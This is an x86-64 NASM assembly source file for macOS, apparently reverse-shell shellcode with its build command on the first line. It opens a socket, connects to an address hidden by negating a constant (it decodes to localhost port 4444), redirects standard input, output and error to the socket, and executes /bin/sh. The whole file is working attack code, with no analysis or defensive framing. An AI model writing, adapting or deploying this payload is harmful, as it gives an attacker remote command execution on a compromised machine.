;nasm -f macho64 -o ipv4rev.o ipv4rev.s && ld -macosx_version_min 10.7.0 -o ipv4rev ipv4rev.o

BITS 64

section .text

global start

start:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xfeffff80a3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; connect(sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x62
    syscall    

    xor rsi, rsi
    mov sil, 0x3

dup2:
    ; dup2(sockid, 2)
    ;   -> dup2(sockid, 1)
    ;   -> dup2(sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
    